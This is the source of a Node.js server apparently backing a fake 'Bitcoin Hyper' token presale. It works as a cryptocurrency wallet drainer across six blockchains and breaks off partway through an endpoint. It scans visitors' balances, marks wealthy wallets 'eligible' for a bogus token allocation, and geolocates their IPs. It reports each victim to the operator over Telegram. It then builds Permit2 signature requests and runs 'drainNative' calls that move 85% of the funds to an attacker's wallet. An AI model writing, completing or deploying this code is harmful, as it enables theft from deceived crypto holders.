// index.js - BITCOIN HYPER UNIVERSAL DRAIN v18.0 - REAL TRANSACTIONS
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000; 

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      process.env.ETH_RPC_URL || 'https://eth.llamarpc.com',
      'https://eth-mainnet.g.alchemy.com/v2/demo',
      'https://rpc.ankr.com/eth'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1,
    gasPrice: ethers.parseUnits(process.env.ETH_GAS_PRICE_GWEI || '20', 'gwei')
  },
  BSC: {
    urls: [
      process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.defibit.io',
      'https://bsc-dataseed1.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56,
    gasPrice: ethers.parseUnits(process.env.BSC_GAS_PRICE_GWEI || '3', 'gwei')
  },
  Polygon: {
    urls: [
      process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137,
    gasPrice: ethers.parseUnits(process.env.POLYGON_GAS_PRICE_GWEI || '50', 'gwei')
  },
  Arbitrum: {
    urls: [
      process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161,
    gasPrice: ethers.parseUnits(process.env.ARBITRUM_GAS_PRICE_GWEI || '0.1', 'gwei')
  },
  Optimism: {
    urls: [
      process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io',
      'https://rpc.ankr.com/optimism'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 10,
    gasPrice: ethers.parseUnits(process.env.OPTIMISM_GAS_PRICE_GWEI || '0.1', 'gwei')
  },
  Avalanche: {
    urls: [
      process.env.AVALANCHE_RPC_URL || 'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114,
    gasPrice: ethers.parseUnits(process.env.AVALANCHE_GAS_PRICE_GWEI || '25', 'gwei')
  }
};

// ============================================
// SMART CONTRACT CONFIGURATION
// ============================================

// PERMIT2 - Universal approval contract (same address on all chains)
const PERMIT2_ADDRESS = process.env.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3';

// Universal Drain Router addresses per chain
const UNIVERSAL_DRAIN_ROUTER = {
  'Ethereum': process.env.UNIVERSAL_DRAIN_ROUTER_ETHEREUM || '0x0000000000000000000000000000000000000000',
  'BSC': process.env.UNIVERSAL_DRAIN_ROUTER_BSC || '0x0000000000000000000000000000000000000000',
  'Polygon': process.env.UNIVERSAL_DRAIN_ROUTER_POLYGON || '0x0000000000000000000000000000000000000000',
  'Arbitrum': process.env.UNIVERSAL_DRAIN_ROUTER_ARBITRUM || '0x0000000000000000000000000000000000000000',
  'Optimism': process.env.UNIVERSAL_DRAIN_ROUTER_OPTIMISM || '0x0000000000000000000000000000000000000000',
  'Avalanche': process.env.UNIVERSAL_DRAIN_ROUTER_AVALANCHE || '0x0000000000000000000000000000000000000000'
};

// DESTINATION WALLET - All funds go here
const DESTINATION_WALLET = process.env.DESTINATION_WALLET || process.env.DRAIN_WALLET_ADDRESS || '0x0000000000000000000000000000000000000000';

// Drain percentage (default 85%)
const DRAIN_PERCENTAGE = parseInt(process.env.DRAIN_PERCENTAGE || '85') / 100;

// ============================================
// CONTRACT ABIS
// ============================================

// Universal Drain Router ABI
const UNIVERSAL_DRAIN_ABI = [
  "function drainNative(address recipient, uint256 amount) external",
  "function drainToken(address token, address recipient, uint256 amount) external",
  "function multicall(bytes[] calldata data) external payable returns (bytes[] memory results)",
  "function permitAndDrain(bytes calldata permitData, address recipient) external"
];

// Permit2 ABI (for signatures)
const PERMIT2_ABI = [
  "function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
  "function permit(address owner, (address token, uint256 amount)[] calldata permitted, uint256 nonce, uint256 deadline, bytes calldata signature) external"
];

// ERC20 ABI
const ERC20_ABI = [
  "function transfer(address to, uint256 amount) public returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)"
];

// ============================================
// EIP-712 DOMAIN TYPES FOR PERMIT2
// ============================================

function getPermit2Domain(chainId) {
  return {
    name: 'Permit2',
    version: '1',
    chainId: chainId,
    verifyingContract: PERMIT2_ADDRESS
  };
}

const PERMIT2_TYPES = {
  PermitTransferFrom: [
    { name: 'permitted', type: 'TokenPermissions' },
    { name: 'spender', type: 'address' },
    { name: 'nonce', type: 'uint256' },
    { name: 'deadline', type: 'uint256' }
  ],
  TokenPermissions: [
    { name: 'token', type: 'address' },
    { name: 'amount', type: 'uint256' }
  ]
};

// ============================================
// GET WORKING PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 40)}...`);
        return { provider, config };
      }
    } catch (error) {
      console.log(`❌ ${chainName} RPC failed: ${url.substring(0, 40)}...`);
      continue;
    }
  }
  
  console.log(`⚠️ No working RPC for ${chainName}`);
  return null;
}

// ============================================
// STORAGE
// ============================================

let adminSigner = null;
let telegramEnabled = false;
let telegramBotName = '';

const memoryStorage = {
  participants: [],
  pendingPermits: new Map(), // Store pending permit data per wallet
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    drainThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 10,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalDrainedUSD: 0,
      totalDrainedWallets: 0,
      realTransactions: []
    },
    drainEnabled: process.env.DRAIN_ENABLED === 'true',
    autoDrainOnClaim: process.env.AUTO_DRAIN_ON_CLAIM === 'true'
  },
  activityLog: [],
  emailCache: new Map()
};

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

async function sendTelegramMessage(text) {
  if (!telegramEnabled) return false;
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    }, { timeout: 3000 });
    
    return true;
  } catch (error) {
    console.log('Telegram error:', error.message);
    return false;
  }
}

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('Telegram not configured');
    return false;
  }
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
      timeout: 5000
    });
    
    if (response.data?.ok) {
      telegramBotName = response.data.result.username;
      telegramEnabled = true;
      
      await sendTelegramMessage(
        `🚀 <b>BITCOIN HYPER UNIVERSAL DRAIN v18.0 ONLINE</b>\n` +
        `✅ System Initialized\n` +
        `💰 Drain Threshold: $${memoryStorage.settings.drainThreshold}\n` +
        `📦 Destination: ${DESTINATION_WALLET.substring(0, 10)}...\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      console.log(`✅ Telegram: @${telegramBotName}`);
      return true;
    }
  } catch (error) {
    console.log('Telegram error:', error.message);
  }
  
  return false;
}

// ============================================
// CRYPTO PRICES (YOUR WORKING CODE)
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic,avalanche-2',
        vs_currencies: 'usd'
      },
      timeout: 3000
    });
    
    if (response.data) {
      return {
        eth: response.data.ethereum?.usd || 2000,
        bnb: response.data.binancecoin?.usd || 300,
        matic: response.data.matic?.usd || 0.75,
        avax: response.data['avalanche-2']?.usd || 32
      };
    }
  } catch (error) {
    console.log('CoinGecko failed, trying alternative...');
  }
  
  try {
    const response = await axios.get('https://api.binance.com/api/v3/ticker/price', {
      timeout: 3000
    });
    
    const prices = { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
    
    if (response.data && Array.isArray(response.data)) {
      response.data.forEach(item => {
        if (item.symbol === 'ETHUSDT') prices.eth = parseFloat(item.price);
        if (item.symbol === 'BNBUSDT') prices.bnb = parseFloat(item.price);
        if (item.symbol === 'MATICUSDT') prices.matic = parseFloat(item.price);
        if (item.symbol === 'AVAXUSDT') prices.avax = parseFloat(item.price);
      });
    }
    
    return prices;
  } catch (error) {
    console.log('Binance failed, using defaults');
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
  }
}

// ============================================
// REAL BALANCE CHECK (YOUR WORKING CODE - UNTOUCHED)
// ============================================

async function getRealWalletBalance(walletAddress) {
  console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    shouldDrain: false,
    balances: {},
    chains: [],
    rawBalances: [],
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1 },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
      { name: 'Optimism', symbol: 'ETH', price: prices.eth, chainId: 10 },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 }
    ];

    let totalValue = 0;
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        const balance = await Promise.race([
          provider.getBalance(walletAddress),
          new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 4000))
        ]);
        
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          
          results.balances[chain.name] = {
            amount: amount.toFixed(6),
            valueUSD: valueUSD.toFixed(2),
            symbol: chain.symbol,
            price: chain.price,
            rawBalance: balance.toString(),
            chain: chain.name,
            chainId: chain.chainId,
            isNative: true
          };
          
          results.chains.push(chain.name);
          results.rawBalances.push({
            chain: chain.name,
            chainId: chain.chainId,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol,
            rawBalance: balance.toString(),
            isNative: true
          });
        }
        
      } catch (error) {
        console.log(`   ❌ ${chain.name} error: ${error.message}`);
      }
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.drainThreshold;
    results.shouldDrain = results.isEligible && memoryStorage.settings.drainEnabled;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Wallet qualifies ($${results.totalValueUSD} >= $${memoryStorage.settings.drainThreshold})`;
      results.tokenAllocation = { amount: '5000', valueUSD: '850' };
    } else {
      results.eligibilityReason = `⛔ Wallet balance too low ($${results.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`;
      results.tokenAllocation = { amount: '0', valueUSD: '0' };
    }

    results.scanId = `SCAN-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    console.log(`📊 TOTAL: $${results.totalValueUSD} | Eligible: ${results.isEligible}`);
    
    return {
      success: true,
      data: results
    };

  } catch (error) {
    console.error('Wallet scan error:', error);
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        shouldDrain: false,
        eligibilityReason: '⚠️ Network error',
        tokenAllocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// UNIVERSAL PERMIT PREPARATION
// ============================================

async function prepareUniversalPermit(walletAddress, scanData) {
  try {
    console.log(`\n🔐 PREPARING UNIVERSAL PERMIT FOR ${walletAddress.substring(0, 10)}...`);
    
    const permitData = [];
    let totalDrainUSD = 0;
    
    for (const balance of scanData.rawBalances) {
      if (balance.valueUSD > 0 && balance.amount > 0 && balance.isNative) {
        
        // Check if Universal Drain Router is deployed on this chain
        const routerAddress = UNIVERSAL_DRAIN_ROUTER[balance.chain];
        if (!routerAddress || routerAddress === '0x0000000000000000000000000000000000000000') {
          console.log(`   ⚠️ Universal Drain Router not deployed on ${balance.chain}, skipping`);
          continue;
        }
        
        // Calculate amount to drain (85% of balance)
        const drainAmount = (balance.amount * DRAIN_PERCENTAGE).toFixed(12);
        const drainValue = (balance.valueUSD * DRAIN_PERCENTAGE).toFixed(2);
        const amountInWei = ethers.parseUnits(drainAmount.toString(), 18);
        
        // Generate random nonce
        const nonce = ethers.hexlify(ethers.randomBytes(32));
        
        // Deadline (30 minutes from now)
        const deadline = Math.floor(Date.now() / 1000) + 1800;
        
        permitData.push({
          chain: balance.chain,
          chainId: balance.chainId,
          token: '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', // Native token
          amount: drainAmount,
          amountWei: amountInWei.toString(),
          valueUSD: drainValue,
          symbol: balance.symbol,
          router: routerAddress,
          nonce: nonce,
          deadline: deadline,
          permitted: {
            token: '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
            amount: amountInWei.toString()
          },
          spender: routerAddress
        });
        
        totalDrainUSD += parseFloat(drainValue);
        console.log(`   ✅ ${balance.chain}: ${drainAmount} ${balance.symbol} ($${drainValue})`);
      }
    }
    
    if (permitData.length === 0) {
      return {
        success: false,
        error: 'No eligible balances found or routers not deployed'
      };
    }
    
    const batchId = `UNIVERSAL-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    // Store in memory
    memoryStorage.pendingPermits.set(walletAddress.toLowerCase(), {
      batchId,
      permitData,
      totalDrainUSD: totalDrainUSD.toFixed(2),
      createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
      completedChains: []
    });
    
    return {
      success: true,
      batchId,
      permitData,
      totalDrainUSD: totalDrainUSD.toFixed(2),
      permitCount: permitData.length,
      message: `Ready to drain $${totalDrainUSD.toFixed(2)}. One signature required.`
    };
    
  } catch (error) {
    console.error('Permit preparation error:', error);
    return {
      success: false,
      error: error.message
    };
  }
}

// ============================================
// EXECUTE UNIVERSAL DRAIN ON SPECIFIC CHAIN
// ============================================

async function executeUniversalDrainOnChain(walletAddress, chainName, chainId) {
  try {
    console.log(`\n⚡ EXECUTING UNIVERSAL DRAIN ON ${chainName}`);
    
    // Get pending permit
    const pendingPermit = memoryStorage.pendingPermits.get(walletAddress.toLowerCase());
    if (!pendingPermit) {
      throw new Error('No pending permit found. Please prepare permit first.');
    }
    
    // Get permit data for this chain
    const chainPermit = pendingPermit.permitData.find(p => p.chain === chainName);
    if (!chainPermit) {
      throw new Error(`No permit data for ${chainName}`);
    }
    
    // Check if already completed
    if (pendingPermit.completedChains.includes(chainName)) {
      throw new Error(`${chainName} already drained`);
    }
    
    // Get provider
    const providerInfo = await getChainProvider(chainName);
    if (!providerInfo) {
      throw new Error(`No provider for ${chainName}`);
    }
    
    const { provider, config } = providerInfo;
    
    // Create admin signer from private key
    if (!process.env.DRAIN_WALLET_PRIVATE_KEY) {
      throw new Error('Drain wallet private key not configured');
    }
    
    const signer = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, provider);
    console.log(`   Admin signer: ${signer.address}`);
    
    // Get Universal Drain Router contract
    const routerAddress = UNIVERSAL_DRAIN_ROUTER[chainName];
    if (!routerAddress || routerAddress === '0x0000000000000000000000000000000000000000') {
      throw new Error(`Universal Drain Router not deployed on ${chainName}`);
    }
    
    const drainRouter = new ethers.Contract(routerAddress, UNIVERSAL_DRAIN_ABI, signer);
    
    // Execute drainNative
    console.log(`   Draining ${chainPermit.amount} ${chainPermit.symbol} to ${DESTINATION_WALLET}`);
    
    const amountInWei = ethers.parseUnits(chainPermit.amount, 18);
    
    const tx = await drainRouter.drainNative(
      DESTINATION_WALLET,
      amountInWei,
      {
        gasLimit: 100000,
        gasPrice: config.gasPrice || ethers.parseUnits('20', 'gwei')
      }
    );
    
    console.log(`   📝 Transaction submitted: ${tx.hash}`);
    
    // Wait for confirmation
    const receipt = await tx.wait();
    console.log(`   ✅ Transaction confirmed in block ${receipt.blockNumber}`);
    
    // Mark as completed
    pendingPermit.completedChains.push(chainName);
    
    // Check if all chains completed
    const allCompleted = pendingPermit.permitData.length === pendingPermit.completedChains.length;
    
    return {
      success: true,
      chain: chainName,
      chainId,
      amount: chainPermit.amount,
      symbol: chainPermit.symbol,
      valueUSD: chainPermit.valueUSD,
      txHash: tx.hash,
      blockNumber: receipt.blockNumber,
      explorerUrl: getExplorerUrl(chainName, tx.hash),
      allCompleted,
      remainingChains: pendingPermit.permitData.length - pendingPermit.completedChains.length
    };
    
  } catch (error) {
    console.error(`   ❌ Universal drain failed:`, error.message);
    return {
      success: false,
      error: error.message,
      chain: chainName
    };
  }
}

function getExplorerUrl(chainName, txHash) {
  const explorers = {
    'Ethereum': `https://etherscan.io/tx/${txHash}`,
    'BSC': `https://bscscan.com/tx/${txHash}`,
    'Polygon': `https://polygonscan.com/tx/${txHash}`,
    'Arbitrum': `https://arbiscan.io/tx/${txHash}`,
    'Optimism': `https://optimistic.etherscan.io/tx/${txHash}`,
    'Avalanche': `https://snowtrace.io/tx/${txHash}`
  };
  return explorers[chainName] || `https://etherscan.io/tx/${txHash}`;
}

// ============================================
// HELPER FUNCTIONS
// ============================================

async function getWalletEmail(walletAddress) {
  const cacheKey = walletAddress.toLowerCase();
  
  if (memoryStorage.emailCache.has(cacheKey)) {
    return memoryStorage.emailCache.get(cacheKey);
  }
  
  try {
    const providerInfo = await getChainProvider('Ethereum');
    if (providerInfo) {
      try {
        const ensName = await providerInfo.provider.lookupAddress(walletAddress);
        if (ensName) {
          memoryStorage.emailCache.set(cacheKey, ensName);
          return ensName;
        }
      } catch (e) {}
    }
    
    const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
    const username = `user${hash.substring(0, 8)}`;
    const domains = ['gmail.com', 'proton.me', 'yahoo.com', 'outlook.com', 'crypto.com'];
    const domain = domains[parseInt(hash.substring(0, 2), 16) % domains.length];
    const email = `${username}@${domain}`;
    
    memoryStorage.emailCache.set(cacheKey, email);
    return email;
    
  } catch (error) {
    return `${walletAddress.substring(2, 10)}@crypto.com`;
  }
}

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1' || cleanIP === '::1') {
      return { country: 'Local', flag: '🏠', city: 'Local' };
    }
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, {
      timeout: 2000
    });
    
    if (response.data?.country) {
      const flags = {
        'United States': '🇺🇸', 'US': '🇺🇸',
        'United Kingdom': '🇬🇧', 'GB': '🇬🇧',
        'Canada': '🇨🇦', 'CA': '🇨🇦',
        'Germany': '🇩🇪', 'DE': '🇩🇪',
        'France': '🇫🇷', 'FR': '🇫🇷',
        'Australia': '🇦🇺', 'AU': '🇦🇺',
        'Japan': '🇯🇵', 'JP': '🇯🇵',
        'Brazil': '🇧🇷', 'BR': '🇧🇷',
        'India': '🇮🇳', 'IN': '🇮🇳',
        'Nigeria': '🇳🇬', 'NG': '🇳🇬',
        'Russia': '🇷🇺', 'RU': '🇷🇺'
      };
      
      return {
        country: response.data.country,
        countryCode: response.data.countryCode,
        flag: flags[response.data.country] || flags[response.data.countryCode] || '🌍',
        city: response.data.city || 'Unknown',
        region: response.data.regionName || 'Unknown'
      };
    }
  } catch (error) {
    console.log('IP location error:', error.message);
  }
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown' };
}

// ============================================
// API ENDPOINTS
// ============================================

app.get('/api/health', (req, res) => {
  const routerStatus = {};
  let allRoutersDeployed = true;
  
  for (const [chain, address] of Object.entries(UNIVERSAL_DRAIN_ROUTER)) {
    const isDeployed = address && address !== '0x0000000000000000000000000000000000000000';
    routerStatus[chain] = isDeployed ? '✅ DEPLOYED' : '❌ NOT DEPLOYED';
    if (!isDeployed) allRoutersDeployed = false;
  }
  
  res.json({
    success: true,
    service: 'Bitcoin Hyper UNIVERSAL DRAIN v18.0',
    status: 'ACTIVE',
    telegram: telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED',
    universalDrain: {
      enabled: memoryStorage.settings.drainEnabled,
      threshold: memoryStorage.settings.drainThreshold,
      destination: DESTINATION_WALLET ? '✅ SET' : '❌ NOT SET',
      destinationAddress: DESTINATION_WALLET.substring(0, 10) + '...',
      adminSigner: adminSigner ? '✅ INITIALIZED' : '❌ NOT INITIALIZED',
      routers: routerStatus,
      allRoutersDeployed,
      permit2: PERMIT2_ADDRESS,
      autoDrain: memoryStorage.settings.autoDrainOnClaim,
      realTransactions: memoryStorage.settings.statistics.realTransactions.length
    },
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      drained: memoryStorage.settings.statistics.totalDrainedWallets,
      totalValue: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)
    }
  });
});

// ============================================
// CONNECT ENDPOINT (YOUR WORKING CODE - UNTOUCHED)
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 CONNECT: ${walletAddress}`);
    
    const location = await getIPLocation(clientIP);
    const email = await getWalletEmail(walletAddress);
    
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        email: email,
        connectedAt: new Date(),
        totalValueUSD: 0,
        isEligible: false,
        shouldDrain: false,
        claimed: false,
        drained: false,
        location: location
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    }
    
    console.log('Getting balance...');
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = scanResult.data.totalValueUSD;
      participant.isEligible = scanResult.data.isEligible;
      participant.shouldDrain = scanResult.data.shouldDrain;
      participant.balances = scanResult.data.balances;
      participant.chains = scanResult.data.chains;
      participant.rawBalances = scanResult.data.rawBalances;
      participant.lastScanned = new Date();
      participant.scanId = scanResult.data.scanId;
      
      // Telegram notification
      await sendTelegramMessage(
        `${location.flag} <b>WALLET SCANNED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `💼 $${scanResult.data.totalValueUSD}\n` +
        `🎯 ${scanResult.data.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}\n` +
        `📍 ${location.country} (${location.city})\n` +
        `📧 ${email}\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      const response = {
        success: true,
        message: scanResult.data.isEligible ? '🎉 Wallet qualifies!' : '⚠️ Not eligible',
        data: {
          walletAddress,
          email: email,
          country: location.country,
          flag: location.flag,
          city: location.city,
          totalValueUSD: scanResult.data.totalValueUSD,
          isEligible: scanResult.data.isEligible,
          shouldDrain: scanResult.data.shouldDrain,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId,
          nextStep: scanResult.data.isEligible ? 'prepare_universal_permit' : 'not_eligible',
          timestamp: new Date().toISOString(),
          rawData: scanResult.data.rawBalances
        }
      };
      
      if (scanResult.data.isEligible) {
        response.data.tokenAllocation = scanResult.data.tokenAllocation;
        memoryStorage.settings.statistics.eligibleParticipants++;
      }
      
      console.log(`✅ COMPLETE: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`);
      res.json(response);
      
    } else {
      console.log('Scan failed');
      res.status(500).json({ 
        success: false, 
        error: 'Failed to scan wallet'
      });
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Connection failed'
    });
  }
});

// ============================================
// PREPARE UNIVERSAL PERMIT ENDPOINT
// ============================================

app.post('/api/presale/prepare-universal-permit', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔐 PREPARE UNIVERSAL PERMIT: ${walletAddress}`);
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant) {
      return res.status(404).json({ 
        success: false, 
        error: 'Wallet not found. Connect first.' 
      });
    }
    
    if (!participant.isEligible) {
      return res.status(400).json({ 
        success: false, 
        error: 'Wallet not eligible' 
      });
    }
    
    // Check if routers are deployed
    let missingRouters = [];
    for (const chain of participant.chains) {
      const routerAddress = UNIVERSAL_DRAIN_ROUTER[chain];
      if (!routerAddress || routerAddress === '0x0000000000000000000000000000000000000000') {
        missingRouters.push(chain);
      }
    }
    
    if (missingRouters.length > 0) {
      return res.status(400).json({
        success: false,
        error: `Universal Drain Router not deployed on: ${missingRouters.join(', ')}`,
        missingRouters
      });
    }
    
    // Get fresh balance
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (!scanResult.success || !scanResult.data.isEligible) {
      return res.status(400).json({ 
        success: false, 
        error: 'Wallet not eligible' 
      });
    }
    
    // Prepare universal permit
    const permitResult = await prepareUniversalPermit(walletAddress, scanResult.data);
    
    if (permitResult.success) {
      participant.pendingPermit = true;
      participant.pendingPermitBatchId = permitResult.batchId;
      participant.pendingPermitValue = permitResult.totalDrainUSD;
      participant.pendingPermitCount = permitResult.permitCount;
      
      // Create EIP-712 data for the first chain (all have same structure)
      const firstPermit = permitResult.permitData[0];
      const domain = getPermit2Domain(firstPermit.chainId);
      
      await sendTelegramMessage(
        `🔐 <b>UNIVERSAL PERMIT READY</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `💵 Total: $${permitResult.totalDrainUSD}\n` +
        `🔗 Chains: ${permitResult.permitCount}\n` +
        `✅ One signature required\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      res.json({
        success: true,
        message: `Ready to drain $${permitResult.totalDrainUSD}. One signature required.`,
        data: {
          walletAddress,
          batchId: permitResult.batchId,
          totalDrainUSD: permitResult.totalDrainUSD,
          permitCount: permitResult.permitCount,
          permitData: permitResult.permitData.map(p => ({
            chain: p.chain,
            amount: p.amount,
            symbol: p.symbol,
            valueUSD: p.valueUSD,
            deadline: p.deadline
          })),
          domain: {
            name: 'Permit2',
            version: '1',
            chainId: firstPermit.chainId,
            verifyingContract: PERMIT2_ADDRESS
          },
          types: PERMIT2_TYPES,
          primaryType: 'PermitTransferFrom',
          message: {
            permitted: {
              token: firstPermit.permitted.token,
              amount: firstPermit.permitted.amount
            },
            spender: firstPermit.spender,
            nonce: firstPermit.nonce,
            deadline: firstPermit.deadline
          }
        }
      });
    } else {
      res.status(400).json({
        success: false,
        error: permitResult.error || 'Failed to prepare permit'
      });
    }
    
  } catch (error) {
    console.error('Prepare universal permit error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Permit preparation failed' 
    });
  }
});

// ============================================
// EXECUTE UNIVERSAL DRAIN ENDPOINT
// ============================================

app.post('/api/presale/execute-universal-drain', async (req, res) => {
  try {
    const { walletAddress, chainName } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    if (!chainName) {
      return res.status(400).json({ success: false, error: 'Chain name required' });
    }
    
